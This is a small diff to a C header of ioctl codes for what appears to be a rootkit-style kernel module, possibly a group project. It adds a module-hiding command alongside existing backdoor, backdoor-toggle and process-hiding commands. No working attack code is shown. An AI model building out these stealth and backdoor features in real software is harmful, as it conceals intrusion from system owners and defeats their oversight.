@@ -9,5 +9,6 @@
 #define G7_BACKDOOR _IOR(G7_MAGIC_NUMBER, 0x2, char *)
 #define G7_TOGGLEBD _IOR(G7_MAGIC_NUMBER, 0x3, char *)
 #define G7_HIDEPID  _IOR(G7_MAGIC_NUMBER, 0x4, char *)
+#define G7_MODHIDE  _IOR(G7_MAGIC_NUMBER, 0x5, char *)
 
 #endif//_GROUP7_IOCTL_H
